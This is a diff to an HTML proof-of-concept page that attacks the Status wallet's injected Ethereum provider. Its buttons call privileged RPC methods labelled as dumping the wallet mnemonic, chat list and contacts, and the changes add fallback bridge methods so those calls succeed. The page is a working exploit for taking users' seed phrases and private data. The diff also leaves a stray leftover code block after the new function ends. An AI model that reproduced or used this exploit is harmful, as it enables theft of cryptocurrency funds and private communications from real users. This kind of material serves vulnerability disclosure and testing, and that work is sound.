@@ -13,21 +13,44 @@
     <button onclick="runPOC('settings_getSettings')">1. Dump Mnemonic (settings_getSettings)</button>
     <button onclick="runPOC('wakuext_chats', [])">2. Dump Chat List</button>
     <button onclick="runPOC('wakuext_contacts', [])">3. Dump Contacts</button>
-    <button onclick="checkEnv()">0. Check Environment</button>
+    <button onclick="checkEnv()">4. Check Environment</button>
     <pre id="out">Output will appear here...</pre>
   
   <script>
   async function sendRPC(method, params) {
-    const payload = { jsonrpc: '2.0', id: 1, method, params: params || [] };
+    const payload = { jsonrpc: '2.0', id: Date.now(), method, params: params || [] };
 
-    // Strategy 1: EIP-1193 request()
-    if (window.ethereum && window.ethereum.request) {
-      try {
-        return await window.ethereum.request({ method, params: params || [] });
-      } catch (e) {
-        console.log('request() failed, trying sendAsync:', e);
-      }
+    // Pattern 1: EIP-1193 request() — may be on prototype
+    if (typeof window.ethereum.request === 'function') {
+      return await window.ethereum.request({ method, params: params || [] });
     }
+
+    // Pattern 2: sendAsync (legacy Status bridge)
+    if (typeof window.ethereum.sendAsync === 'function') {
+      return new Promise((resolve, reject) => {
+        window.ethereum.sendAsync(payload, (err, res) => {
+          if (err) reject(err);
+          else if (res.error) reject(res.error);
+          else resolve(res.result);
+        });
+      });
+    }
+
+    // Pattern 3: nativeEthereum direct bridge
+    if (window.ethereum.nativeEthereum) {
+      return new Promise((resolve, reject) => {
+        window.ethereum.nativeEthereum.send(JSON.stringify(payload), (response) => {
+          try {
+            const res = JSON.parse(response);
+            if (res.error) reject(res.error);
+            else resolve(res.result);
+          } catch(e) { reject(e); }
+        });
+      });
+    }
+
+    throw new Error('No usable provider method found');
+  }
 
     // Strategy 2: Legacy sendAsync (Status injected provider)
     return new Promise((resolve, reject) => {
